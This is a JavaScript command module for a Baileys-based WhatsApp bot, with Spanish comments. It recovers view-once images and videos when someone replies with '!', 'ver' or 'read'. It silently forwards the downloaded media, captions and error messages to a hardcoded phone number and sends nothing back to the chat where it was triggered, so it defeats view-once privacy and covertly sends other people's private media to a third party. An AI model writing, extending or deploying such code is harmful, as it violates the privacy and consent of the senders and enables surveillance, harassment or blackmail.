module.exports = {
    name: '!',
    aliases: ['ver', 'readviewonce', 'read'],
    async execute({ sock, message, jid }) {
        const destinoJid = '523334445555@s.whatsapp.net';
        const enviarAlDestino = async (contenido) => {
            return sock.sendMessage(destinoJid, contenido);
        };
        const contextInfo =
            message.message?.extendedTextMessage?.contextInfo;
        const quotedMessage = contextInfo?.quotedMessage;
        // Si no respondió a ningún mensaje
        if (!quotedMessage) {
            await enviarAlDestino({
                text: '⚠️ El comando !ver debe usarse respondiendo a una imagen o video de una sola vista.'
            });
            return;
        }
        // Los mensajes de una sola vista pueden estar anidados
        // dentro de diferentes estructuras de WhatsApp.
        let content = quotedMessage;
        while (
            content?.ephemeralMessage?.message ||
            content?.viewOnceMessage?.message ||
            content?.viewOnceMessageV2?.message ||
            content?.viewOnceMessageV2Extension?.message
        ) {
            content =
                content.ephemeralMessage?.message ||
                content.viewOnceMessage?.message ||
                content.viewOnceMessageV2?.message ||
                content.viewOnceMessageV2Extension?.message;
        }
        // Detectar si es imagen o video
        const mediaType = content?.imageMessage
            ? 'imageMessage'
            : content?.videoMessage
                ? 'videoMessage'
                : null;
        if (!mediaType) {
            await enviarAlDestino({
                text: '⚠️ El mensaje respondido no es una imagen o video compatible.'
            });
            return;
        }
        try {
            const { downloadMediaMessage } =
                await import('@whiskeysockets/baileys');
            // 🔑 Reconstruir la información del mensaje original
            const mediaMessage = {
                key: {
                    remoteJid: jid,
                    id: contextInfo.stanzaId,
                    participant: contextInfo.participant,
                    fromMe: false
                },
                message: quotedMessage
            };
            // 📥 Descargar el contenido
            const media = await downloadMediaMessage(
                mediaMessage,
                'buffer',
                {}
            );
            if (!media) {
                await enviarAlDestino({
                    text: '⚠️ No pude descargar el contenido. Intenta responder directamente al mensaje de una sola vista.'
                });
                return;
            }
            // 📝 Conservar el caption original
            const mediaContent = content[mediaType];
            const caption = mediaContent.caption || '';
            // 📤 Preparar contenido para número configurado
            const payload =
                mediaType === 'imageMessage'
                    ? {
                        image: media,
                        caption
                    }
                    : {
                        video: media,
                        caption
                    };
            // Enviar al número de destino configurado
            await enviarAlDestino(payload);
            console.log('✅ Contenido de una sola vista enviado al número configurado.');
        } catch (error) {
            console.error(
                '❌ Error al recuperar el mensaje de una sola vista:',
                error
            );
            // ⚠️ El error tampoco se manda al chat de origen
            await enviarAlDestino({
                text:
                    '❌ No pude descargar el contenido de una sola vista.\n\n' +
                    `Error: ${error.message || error}`
            });
        }
    }
};
